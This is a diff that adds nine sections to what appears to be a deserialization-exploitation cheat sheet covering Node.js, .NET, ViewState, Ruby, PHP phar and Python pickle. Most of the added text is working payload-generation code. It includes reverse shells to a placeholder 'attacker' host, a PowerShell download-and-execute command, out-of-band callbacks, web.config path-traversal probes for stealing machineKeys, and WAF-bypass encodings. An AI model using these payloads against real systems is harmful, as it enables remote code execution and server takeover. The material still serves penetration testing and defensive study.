@@ -17,6 +17,15 @@
 7. [Ruby Deserialization](#7-ruby-deserialization)
 8. [Gadget Chain Analysis](#8-gadget-chain-analysis)
 9. [Deserialization Bypass Techniques](#9-deserialization-bypass-techniques)
+10. [Node.js Deserialization Payloads](#10-nodejs-deserialization-payloads)
+11. [.NET BinaryFormatter Payloads](#11-net-binaryformatter-payloads)
+12. [.NET ViewState Exploitation](#12-net-viewstate-exploitation)
+13. [Ruby Deserialization Payloads](#13-ruby-deserialization-payloads)
+14. [PHP Phar Deserialization](#14-php-phar-deserialization)
+15. [Python Pickle RCE Payloads](#15-python-pickle-rce-payloads)
+16. [Gadget Chain Reference](#16-gadget-chain-reference)
+17. [Deserialization Detection Payloads](#17-deserialization-detection-payloads)
+18. [WAF and Filter Bypass Payloads](#18-waf-and-filter-bypass-payloads)
 
 ---
 
@@ -1159,4 +1168,838 @@ ysoserial.net -g ActivitySurrogateSelectorFromFile -f BinaryFormatter \
   -c "cmd /c calc" \
   --input-file custom_shellcode.dll \
   --base64
+```
+
+---
+
+## 10. Node.js Deserialization Payloads
+
+### node-serialize IIFE Injection
+
+```bash
+# Basic IIFE injection via node-serialize
+# The _$$ND_FUNC$$ marker allows function serialization
+node -e '
+var serialize = require("node-serialize");
+var payload = serialize.serialize(function() {
+  return "_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\", function(e,s){console.log(s)})}()";
+});
+console.log(payload);
+'
+
+# Craft direct RCE payload
+node -e '
+var payload = "{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").exec(\\\"id > /tmp/pwned\\\")}()\"}";
+console.log(payload);
+'
+# Inject into cookie or POST parameter
+
+# Reverse shell via node-serialize
+node -e '
+var payload = "{\"shell\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").exec(\\\"bash -c \\\\\\\"bash -i >& /dev/tcp/attacker/4444 0>&1\\\\\\\"\\\")}()\"}";
+console.log(payload);
+'
+
+# DNS callback detection
+node -e '
+var payload = "{\"probe\":\"_$$ND_FUNC$$_function(){require(\\\"dns\\\").resolve(\\\"nodejs.attacker.com\\\")}()\"}";
+console.log(payload);
+'
+```
+
+### funcster Exploitation
+
+```bash
+# funcster uses a similar pattern with __function__
+# Exploitable when user input reaches funcster.deserialize()
+node -e '
+var payload = JSON.stringify({
+  "__function__": {
+    "__name__": "rce",
+    "__body__": "require(\"child_process\").execSync(\"id\").toString()"
+  }
+});
+console.log(payload);
+'
+
+# funcster reverse shell payload
+node -e '
+var payload = JSON.stringify({
+  "__function__": {
+    "__name__": "shell",
+    "__body__": "require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/attacker/4444 0>&1\\\"\")"
+  }
+});
+console.log(payload);
+'
+```
+
+### Prototype Pollution to Deserialization
+
+```bash
+# Prototype pollution can create deserialization gadgets
+# Merge function that does not sanitize __proto__
+node -e '
+var merge = require("deepmerge");
+var payload = JSON.parse("{\"__proto__\":{\"isAdmin\":true}}");
+var obj = merge({}, payload);
+console.log({}.isAdmin); // true - prototype polluted
+'
+
+# Express middleware prototype pollution
+# Craft payload to pollute Object.prototype before deserialization
+node -e '
+var payload = JSON.stringify({
+  "__proto__": {
+    "shell": "require(\"child_process\").execSync(\"id\")"
+  }
+});
+console.log(payload);
+'
+```
+
+---
+
+## 11. .NET BinaryFormatter Payloads
+
+### Advanced BinaryFormatter Exploitation
+
+```bash
+# ActivitySurrogateSelector gadget (requires specific .NET version)
+ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c whoami" --base64
+
+# ActivitySurrogateSelectorFromFile for custom assembly loading
+ysoserial.net -g ActivitySurrogateSelectorFromFile -f BinaryFormatter \
+  -c "cmd /c calc" --input-file custom.dll --base64
+
+# TextFormattingRunProperties (Visual Studio / Azure DevOps)
+ysoserial.net -g TextFormattingRunProperties -f BinaryFormatter \
+  -c "cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker/ps.ps1')" --base64
+
+# WindowsIdentity gadget chain
+ysoserial.net -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami" --base64
+
+# TypeConfuseDelegate (compact, reliable)
+ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" --base64
+
+# ObjectDataProvider (versatile, works with multiple formatters)
+ysoserial.net -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami" --base64
+```
+
+### SoapFormatter and Other .NET Formatters
+
+```bash
+# SoapFormatter (XML-based .NET serialization)
+ysoserial.net -g ObjectDataProvider -f SoapFormatter -c "cmd /c whoami" --base64
+
+# NetDataContractSerializer (WCF)
+ysoserial.net -g ObjectDataProvider -f NetDataContractSerializer -c "cmd /c whoami" --base64
+
+# DataContractSerializer (limited but exploitable with known types)
+ysoserial.net -g WindowsIdentity -f DataContractSerializer -c "cmd /c whoami" --base64
+
+# ObjectStateFormatter (hidden field deserialization)
+ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c whoami" --base64
+```
+
+### .NET Remoting Exploitation
+
+```bash
+# .NET Remoting BinaryFormatter exploitation
+# Generate payload for remoting channel
+ysoserial.net -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami" --base64
+
+# Send via .NET Remoting IPC
+curl -X POST http://target/remoting/Service.rem \
+  -H 'Content-Type: application/octet-stream' \
+  --data-binary @<(echo "PAYLOAD_BASE64" | base64 -d)
+
+# WCF NetTcpBinding deserialization
+# Requires custom client or TCP-level payload delivery
+ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" --base64
+```
+
+---
+
+## 12. .NET ViewState Exploitation
+
+### ViewState with Known MachineKey
+
+```bash
+# Generate ViewState with full machineKey parameters
+ysoserial.net -g ObjectDataProvider -f LosFormatter \
+  -c "cmd /c whoami" --base64 \
+  --machinekey "VALIDATION_KEY_HEX,DECRYPTION_KEY_HEX" \
+  --path="/default.aspx" --target=ViewState
+
+# ViewState with SHA1 validation and AES decryption
+ysoserial.net -g TypeConfuseDelegate -f LosFormatter \
+  -c "cmd /c echo pwned > C:\pwned.txt" --base64 \
+  --machinekey "VKEY,DKEY" \
+  --validation SHA1 --decryption AES
+
+# ViewState with MD5 validation (weak, exploitable)
+ysoserial.net -g ObjectDataProvider -f LosFormatter \
+  -c "cmd /c whoami" --base64 \
+  --machinekey "VKEY,DKEY" \
+  --validation MD5 --decryption DES
+
+# ViewState targeting specific ASP.NET page
+ysoserial.net -g ActivitySurrogateSelector -f LosFormatter \
+  -c "cmd /c calc.exe" --base64 \
+  --machinekey "VKEY,DKEY" \
+  --path="/admin/users.aspx" --target=ViewState
+```
+
+### ViewState without MAC (Legacy)
+
+```bash
+# Legacy ASP.NET with ViewState validation disabled
+ysoserial.net -g ObjectDataProvider -f LosFormatter \
+  -c "cmd /c whoami" --base64 --islegacy
+
+# Legacy ViewState with debug flag
+ysoserial.net -g TypeConfuseDelegate -f LosFormatter \
+  -c "cmd /c echo pwned" --base64 --islegacy --isdebug
+
+# Exploit ViewState on specific .NET framework version
+ysoserial.net -g ActivitySurrogateSelector -f LosFormatter \
+  -c "cmd /c calc.exe" --base64 --islegacy
+```
+
+### machineKey Extraction and Exploitation
+
+```bash
+# Common machineKey disclosure paths:
+# 1. web.config exposed via path traversal or misconfiguration
+# 2. Error messages revealing configuration
+# 3. Source code repository leaks
+# 4. Shared hosting with predictable keys
+
+# Check for exposed web.config
+curl -s http://target/web.config
+curl -s http://target/Web.config
+curl -s http://target/%70web.config  # URL encoding bypass
+curl -s http://target/..%5C..%5Cweb.config  # Path traversal
+
+# Parse machineKey from web.config
+grep -oP 'validationKey="[^"]*"' web.config
+grep -oP 'decryptionKey="[^"]*"' web.config
+grep -oP 'validation="[^"]*"' web.config
+grep -oP 'decryption="[^"]*"' web.config
+
+# Once machineKey is obtained, generate ViewState payload
+# Extract: validationKey, decryptionKey, validation algo, decryption algo
+ysoserial.net -g ObjectDataProvider -f LosFormatter \
+  -c "cmd /c powershell -enc BASE64_PS_COMMAND" --base64 \
+  --machinekey "EXTRACTED_VALIDATION_KEY,EXTRACTED_DECRYPTION_KEY" \
+  --validation SHA1 --decryption AES \
+  --path="/target.aspx"
+```
+
+---
+
+## 13. Ruby Deserialization Payloads
+
+### Ruby ERB and YAML Gadget Chains
+
+```bash
+# Ruby ERB deserialization via YAML
+ruby -e '
+require "yaml"
+payload = <<~YAML
+---
+!ruby/object:ERB
+src: "system(\"id\")"
+YAML
+puts "YAML payload:"
+puts payload
+puts "Base64: #{require \"base64\"; Base64.strict_encode64(payload)}"
+'
+
+# Ruby Gem::Requirement chain
+ruby -e '
+require "yaml"
+payload = <<~YAML
+---
+!ruby/object:Gem::Requirement
+requirements:
+  - !ruby/object:Gem::Dependency
+    name: !ruby/object:ERB
+      src: "system(\"whoami\")"
+YAML
+puts payload
+'
+
+# Ruby Gem::RequestSet chain (CVE-2022-32224)
+ruby -e '
+require "yaml"
+payload = <<~YAML
+---
+!ruby/object:Gem::RequestSet
+sets:
+  - !ruby/object:Gem::Resolver
+    conflicts: []
+    development: false
+YAML
+puts "Gem::RequestSet payload generated"
+'
+```
+
+### Rails Cookie Marshal Payloads
+
+```bash
+# Generate Rails cookie payload with known secret_key_base
+ruby -e '
+require "base64"
+require "openssl"
+
+secret_key_base = "KNOWN_SECRET_KEY_BASE"
+
+# Rails 4.x key derivation
+key = OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret_key_base, "authenticated encrypted cookie", 1000, 32)
+puts "Derived key: #{Base64.strict_encode64(key)}"
+
+# For Rails 5.x/6.x, derive keys differently
+signing_key = OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret_key_base, "signed cookie", 1000, 32)
+encrypt_key = OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret_key_base, "encrypted cookie", 1000, 32)
+puts "Signing key: #{Base64.strict_encode64(signing_key)}"
+puts "Encrypt key: #{Base64.strict_encode64(encrypt_key)}"
+'
+
+# Full Rails cookie forgery (conceptual)
+ruby -e '
+require "active_support/message_verifier"
+require "base64"
+
+secret = "secret_key_base_here"
+verifier = ActiveSupport::MessageVerifier.new(secret)
+
+# Create a Ruby object that triggers RCE on Marshal.load
+class RCE
+  def marshal_dump; "system(\"id\")"; end
+  def marshal_load(s); eval(s); end
+end
+
+# Forge signed cookie
+# signed_cookie = verifier.generate(RCE.new)
+puts "Forge cookie with rails-cookie-decryptor tool"
+puts "git clone https://github.com/AdrianCX/rails-cookie-decryptor"
+'
+```
+
+### Ruby Command Execution via Deserialization
+
+```bash
+# Ruby reverse shell via Marshal
+ruby -e '
+require "base64"
+
+# Conceptual Marshal payload for command execution
+# Real exploitation requires specific gadget chain matching target gems
+class ShellPayload
+  def initialize
+    @cmd = "bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""
+  end
+end
+
+payload = Marshal.dump(ShellPayload.new)
+puts "Marshal payload (Base64): #{Base64.strict_encode64(payload)}"
+'
+
+# Ruby DNS callback via YAML
+ruby -e '
+require "base64"
+payload = <<~YAML
+---
+!ruby/object:OpenStruct
+table:
+  :dns: !ruby/object:Gem::Dependency
+    name: "nslookup ruby.attacker.com"
+YAML
+puts Base64.strict_encode64(payload)
+'
+```
+
+---
+
+## 14. PHP Phar Deserialization
+
+### Phar File Generation
+
+```bash
+# Generate phar with embedded serialized payload
+phpggc -p phar Laravel/RCE1 'system("id")' -o /tmp/evil.phar
+
+# Generate ZIP-based phar for upload bypass
+phpggc -p zip Laravel/RCE1 'system("id")' -o /tmp/evil.zip
+
+# Generate TAR-based phar
+phpggc -p phar Magento/RCE1 'system("whoami")' -o /tmp/evil.tar
+
+# Verify phar structure
+xxd /tmp/evil.phar | head -20
+php -r "var_dump(new Phar(\"/tmp/evil.phar\"));" 2>/dev/null
+```
+
+### Phar Trigger Vectors
+
+```bash
+# Trigger phar deserialization via file operations
+# These PHP functions trigger phar deserialization when given a phar:// path:
+# file_exists(), is_file(), is_dir(), file_get_contents(), file_put_contents()
+# fopen(), fread(), file(), parse_ini_file(), stat(), lstat()
+# getimagesize(), getimagesizefromstring(), exif_read_data()
+# md5_file(), sha1_file(), hash_file()
+# copy(), rename(), unlink(), rmdir()
+
+# Trigger via image processing (common vector)
+# Step 1: Create phar disguised as image
+cp /tmp/evil.phar /tmp/evil.png
+# Step 2: Upload via image upload endpoint
+curl -X POST http://target/upload.php -F "image=@/tmp/evil.png"
+# Step 3: If target calls getimagesize("phar://uploads/evil.png"), deserialization triggers
+
+# Trigger via file existence check
+# If target code does: file_exists($_GET['file'])
+curl "http://target/page.php?file=phar:///tmp/evil.phar"
+
+# Trigger via md5_file or hash_file
+curl "http://target/page.php?file=phar:///tmp/evil.phar"
+# If code does: md5_file($input) where $input is user-controlled
+
+# Trigger via metadata extraction
+# exif_read_data("phar://uploads/image.jpg") triggers deserialization
+```
+
+### Phar Wrapper Bypass Techniques
+
+```bash
+# Bypass file extension checks with phar wrapper
+# If upload only allows .jpg, .png, .gif:
+phpggc -p phar Monolog/RCE1 'system("id")' -o /tmp/evil.jpg
+
+# Polyglot phar (valid image + phar metadata)
+# Append phar metadata to a real image
+php -r '
+$phar = new Phar("/tmp/polyglot.phar");
+$phar->startBuffering();
+$phar->setStub("\xff\xd8\xff\xe0" . "<?php __HALT_COMPILER(); ?>");
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+'
+
+# Bypass phar:// filter via wrapper chaining
+# php://filter/resource=phar://uploads/evil.jpg
+# compress.zlib://phar://uploads/evil.jpg
+curl "http://target/page.php?file=compress.zlib://phar://uploads/evil.jpg"
+```
+
+---
+
+## 15. Python Pickle RCE Payloads
+
+### Advanced Pickle Exploitation
+
+```bash
+# Subprocess-based RCE with output capture
+python3 -c "
+import pickle, base64, subprocess
+class RCE:
+    def __reduce__(self):
+        return (subprocess.check_output, (['id'],))
+print(base64.b64encode(pickle.dumps(RCE())).decode())
+"
+
+# Eval-based payload for flexible execution
+python3 -c "
+import pickle, base64
+class EvalRCE:
+    def __reduce__(self):
+        return (eval, (\"__import__('os').system('id')\",))
+print(base64.b64encode(pickle.dumps(EvalRCE())).decode())
+"
+
+# Exec-based multi-command payload
+python3 -c "
+import pickle, base64
+class ExecRCE:
+    def __reduce__(self):
+        code = '''
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('attacker',4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(['/bin/sh','-i'])
+'''
+        return (exec, (code,))
+print(base64.b64encode(pickle.dumps(ExecRCE())).decode())
+"
+```
+
+### Pickle Protocol Manipulation
+
+```bash
+# Generate pickle with specific protocol version
+python3 -c "
+import pickle, base64, os
+class P:
+    def __reduce__(self):
+        return (os.system, ('id',))
+# Protocol 0: ASCII printable (for environments that filter binary)
+print('Protocol 0:', pickle.dumps(P(), protocol=0))
+print('Protocol 4:', base64.b64encode(pickle.dumps(P(), protocol=4)).decode())
+print('Protocol 5:', base64.b64encode(pickle.dumps(P(), protocol=5)).decode())
+"
+
+# Bypass RestrictedUnpickler with alternative import paths
+python3 -c "
+import pickle, base64
+class Bypass:
+    def __reduce__(self):
+        return (eval, (\"__import__('subprocess').check_output(['id'])\",))
+print(base64.b64encode(pickle.dumps(Bypass())).decode())
+"
+
+# Pickle opcode-level payload (bypass __reduce__ filters)
+python3 -c "
+import pickle, base64, io, struct
+
+# Custom pickle bytecode using opcodes
+# This demonstrates building payloads at the opcode level
+import pickletools
+payload = pickle.dumps(eval, protocol=4)
+# Inspect opcodes: pickletools.dis(payload)
+print(base64.b64encode(payload).decode())
+"
+```
+
+### Framework-Specific Pickle Payloads
+
+```bash
+# Celery task pickle deserialization
+python3 -c "
+import pickle, base64, os
+class CeleryRCE:
+    def __reduce__(self):
+        return (os.system, ('id',))
+payload = pickle.dumps(CeleryRCE(), protocol=2)
+print('Celery payload:', base64.b64encode(payload).decode())
+"
+
+# Redis/Memcached pickle deserialization
+# If Redis stores pickle-serialized session data
+python3 -c "
+import pickle, base64, os
+class RedisRCE:
+    def __reduce__(self):
+        return (os.system, ('curl http://attacker/redis-rce',))
+payload = pickle.dumps(RedisRCE())
+print(base64.b64encode(payload).decode())
+"
+
+# PyYAML unsafe load exploitation
+python3 -c "
+import base64
+payload = '''!!python/object/apply:os.system ['id']'''
+print(base64.b64encode(payload.encode()).decode())
+"
+
+# PyYAML subprocess variant
+python3 -c "
+import base64
+payload = '''!!python/object/apply:subprocess.check_output
+- - bash
+  - -c
+  - bash -i >& /dev/tcp/attacker/4444 0>&1
+'''
+print(base64.b64encode(payload.encode()).decode())
+"
+```
+
+---
+
+## 16. Gadget Chain Reference
+
+### Java Gadget Chains (ysoserial)
+
+```bash
+# Quick reference for all ysoserial chains with their requirements
+# Format: Chain Name | Required Library | Key Sink
+
+# Commons Collections 3.x chains (most common)
+echo "CommonsCollections1 | CC 3.1-3.2.1 | InvokerTransformer via AnnotationInvocationHandler"
+echo "CommonsCollections3 | CC 3.1-3.2.1 | InstantiateTransformer + TrAXFilter"
+echo "CommonsCollections5 | CC 3.1-3.2.1 | InvokerTransformer via LazyMap + BadAttributeValueExpException"
+echo "CommonsCollections6 | CC 3.1-3.2.1 | HashSet + HashMap + TiedMapEntry"
+echo "CommonsCollections7 | CC 3.1-3.2.1 | Hashtable + AbstractMap + ChainedTransformer"
+
+# Commons Collections 4.x chains
+echo "CommonsCollections2 | CC4 4.0 | TransformingComparator + PriorityQueue + TemplatesImpl"
+echo "CommonsCollections4 | CC4 4.0 | ChainedTransformer + TransformingComparator"
+
+# Spring chains
+echo "Spring1 | Spring Framework | ObjectFactoryDelegatingInvocationHandler"
+echo "Spring2 | Spring Framework | SerializableTypeWrapper.MethodInvokeTypeProvider"
+
+# Hibernate chains
+echo "Hibernate1 | Hibernate | ComponentType.getPropertyValue()"
+echo "Hibernate2 | Hibernate | TypedPropertyValue"
+
+# Other chains
+echo "Groovy1 | Groovy | ConversionHandler"
+echo "Clojure | Clojure | AbstractTableModel$AffineTransform"
+echo "Jdk7u21 | JDK only (no deps) | AnnotationInvocationHandler + LinkedHashSet"
+echo "BeanShell1 | BeanShell | Interpreter"
+echo "C3P0 | C3P0 | JndiRefForwardingDataSource (JNDI redirect)"
+echo "JBossInterceptors1 | JBoss | ClientMethodInterceptor"
+echo "Wicket1 | Apache Wicket | ObjectStreamFactory"
+echo "URLDNS | JDK only | DNS lookup (detection only, no RCE)"
+```
+
+### .NET Gadget Chains (ysoserial.net)
+
+```bash
+# Quick reference for ysoserial.net chains
+echo "ObjectDataProvider | WPF/PresentationFramework | Method invocation via XAML"
+echo "TypeConfuseDelegate | mscorlib | MulticastDelegate confusion"
+echo "ActivitySurrogateSelector | .NET Framework | Assembly loading via surrogate"
+echo "TextFormattingRunProperties | Visual Studio | WPF text properties"
+echo "WindowsIdentity | System.IdentityModel | Windows identity impersonation"
+
+# Formatter compatibility matrix
+echo "--- Formatter Compatibility ---"
+echo "ObjectDataProvider: BinaryFormatter, LosFormatter, SoapFormatter, NetDataContractSerializer"
+echo "TypeConfuseDelegate: BinaryFormatter, LosFormatter, ObjectStateFormatter"
+echo "ActivitySurrogateSelector: BinaryFormatter, LosFormatter"
+echo "TextFormattingRunProperties: BinaryFormatter, LosFormatter"
+echo "WindowsIdentity: BinaryFormatter, DataContractSerializer"
+```
+
+### PHP Gadget Chains (phpggc)
+
+```bash
+# Quick reference for phpggc chains by framework
+echo "--- Laravel ---"
+echo "Laravel/RCE1 | Monolog-based | system/exec"
+echo "Laravel/RCE2 | Alternative path | system/exec"
+echo "Laravel/RCE3 | Ignition middleware | system/exec"
+echo "Laravel/RCE4 | PendingCommand | command execution"
+echo "Laravel/RCE5 | ReturnCallback | command execution"
+
+echo "--- WordPress ---"
+echo "WordPress/Generic | Generic WP chain | system/exec"
+
+echo "--- Magento ---"
+echo "Magento/RCE1 | Magento 1.x | system/exec"
+echo "Magento/RCE2 | Magento 1.x alt | system/exec"
+echo "Magento2/RCE1 | Magento 2.x | system/exec"
+
+echo "--- Other ---"
+echo "Monolog/RCE1 | Monolog library | system/exec"
+echo "Guzzle/RCE1 | Guzzle HTTP | system/exec"
+echo "Symfony/RCE1-3 | Symfony framework | system/exec"
+echo "Doctrine/RCE1 | Doctrine ORM | system/exec"
+echo "Slim/RCE1-2 | Slim framework | system/exec"
+```
+
+---
+
+## 17. Deserialization Detection Payloads
+
+### Universal Detection Payloads
+
+```bash
+# Java URLDNS chain (safe, no RCE, DNS callback only)
+java -jar ysoserial.jar URLDNS 'http://attacker.com/java-detect' | base64 -w0
+
+# PHP benign object injection test
+php -r 'echo base64_encode(serialize(new Exception("test")));'
+
+# .NET safe ViewState probe (triggers error if ViewState is processed)
+echo "dQ==`" | base64 -d  # Minimal invalid ViewState
+
+# Python safe pickle probe
+python3 -c "
+import pickle, base64
+class Probe:
+    def __reduce__(self):
+        return (print, ('DESERIALIZATION_DETECTED',))
+print(base64.b64encode(pickle.dumps(Probe())).decode())
+"
+```
+
+### Time-Based Detection Payloads
+
+```bash
+# Java 5-second delay
+java -jar ysoserial.jar CommonsCollections5 'sleep 5' | base64 -w0
+
+# Java 10-second delay (high confidence)
+java -jar ysoserial.jar CommonsCollections6 'sleep 10' | base64 -w0
+
+# PHP sleep detection
+phpggc -b Monolog/RCE1 'sleep(5)'
+
+# .NET time delay via ping
+ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c ping -n 6 127.0.0.1" --base64
+
+# Python time-based pickle
+python3 -c "
+import pickle, time, base64
+class TimeProbe:
+    def __reduce__(self):
+        return (time.sleep, (5,))
+print(base64.b64encode(pickle.dumps(TimeProbe())).decode())
+"
+
+# Node.js time-based detection
+node -e '
+var payload = "{\"delay\":\"_$$ND_FUNC$$_function(){var start=Date.now();while(Date.now()-start<5000){}}()\"}";
+console.log(payload);
+'
+
+# Ruby time-based detection
+ruby -e '
+require "base64"
+payload = <<~YAML
+---
+!ruby/object:Gem::Requirement
+requirements:
+  - !ruby/object:Gem::Dependency
+    name: !ruby/object:ERB
+      src: "sleep(5)"
+YAML
+puts Base64.strict_encode64(payload)
+'
+```
+
+### OOB Callback Detection Payloads
+
+```bash
+# Java DNS callback
+java -jar ysoserial.jar CommonsCollections5 'nslookup java.attacker.com' | base64 -w0
+
+# Java HTTP callback
+java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/java-callback' | base64 -w0
+
+# PHP HTTP callback
+phpggc -b Laravel/RCE1 'file_get_contents("http://attacker/php-callback")'
+
+# PHP DNS callback
+phpggc -b Monolog/RCE1 'system("nslookup php.attacker.com")'
+
+# .NET DNS callback
+ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c nslookup dotnet.attacker.com" --base64
+
+# .NET HTTP callback
+ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c curl http://attacker/dotnet-callback" --base64
+
+# Python HTTP callback
+python3 -c "
+import pickle, base64, urllib.request
+class Probe:
+    def __reduce__(self):
+        return (urllib.request.urlopen, ('http://attacker/python-callback',))
+print(base64.b64encode(pickle.dumps(Probe())).decode())
+"
+
+# Python DNS callback
+python3 -c "
+import pickle, base64, socket
+class DNSProbe:
+    def __reduce__(self):
+        return (socket.getaddrinfo, ('python.attacker.com', 80))
+print(base64.b64encode(pickle.dumps(DNSProbe())).decode())
+"
+
+# Node.js HTTP callback
+node -e '
+var payload = "{\"cb\":\"_$$ND_FUNC$$_function(){require(\\\"http\\\").get(\\\"http://attacker/nodejs-callback\\\")}()\"}";
+console.log(payload);
+'
+
+# Ruby HTTP callback
+ruby -e '
+require "base64"
+payload = <<~YAML
+---
+!ruby/object:Gem::Requirement
+requirements:
+  - !ruby/object:Gem::Dependency
+    name: !ruby/object:ERB
+      src: "require(\"open-uri\"); open(\"http://attacker/ruby-callback\")"
+YAML
+puts Base64.strict_encode64(payload)
+'
+```
+
+---
+
+## 18. WAF and Filter Bypass Payloads
+
+### Encoding-Based Bypass
+
+```bash
+# Gzip compression to evade content inspection
+java -jar ysoserial.jar CommonsCollections5 'id' | gzip | base64 -w0
+
+# Double Base64 encoding for nested decode scenarios
+java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0 | base64 -w0
+
+# Zlib compression for .NET payloads
+python3 -c "
+import zlib, base64, sys
+data = sys.stdin.buffer.read()
+print(base64.b64encode(zlib.compress(data)).decode())
+" < payload.bin
+
+# Hex encoding
+java -jar ysoserial.jar CommonsCollections5 'id' | xxd -p | tr -d '\n'
+
+# Base64 with URL-safe alphabet
+java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0 | tr '+/' '-_'
+```
+
+### Class Name Obfuscation
+
+```bash
+# Use alternative chains that avoid blocked class names
+# If CommonsCollections classes are blocked by WAF:
+java -jar ysoserial.jar Spring1 'id' | base64 -w0
+java -jar ysoserial.jar Hibernate1 'id' | base64 -w0
+java -jar ysoserial.jar Groovy1 'id' | base64 -w0
+java -jar ysoserial.jar Jdk7u21 'id' | base64 -w0
+
+# Use URLDNS for safe detection without dangerous classes
+java -jar ysoserial.jar URLDNS 'http://attacker.com/detect' | base64 -w0
+
+# Null byte injection to break pattern matching
+java -jar ysoserial.jar CommonsCollections5 'id' | \
+  python3 -c "
+import sys, base64
+data = sys.stdin.buffer.read()
+modified = data[:4] + b'\x00\x00\x00\x00' + data[4:]
+print(base64.b64encode(modified).decode())
+"
+```
+
+### Protocol-Level Bypass
+
+```bash
+# JRMP indirection (payload contains no dangerous classes)
+java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0
+
+# JNDI LDAP redirect
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker:8000 1389
+java -jar ysoserial.jar Jdk7u21 'ldap://attacker:1389/obj' | base64 -w0
+
+# Multi-hop: JRMP -> LDAP -> HTTP class loading
+java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0
+# Attacker serves: JRMPListener -> LDAPRedirect -> HTTPClassServer
+
+# CORBA/IIOP path
+java -cp marshalsec.jar marshalsec.jndi.CORBARefServer http://attacker:8000 1050
 ```
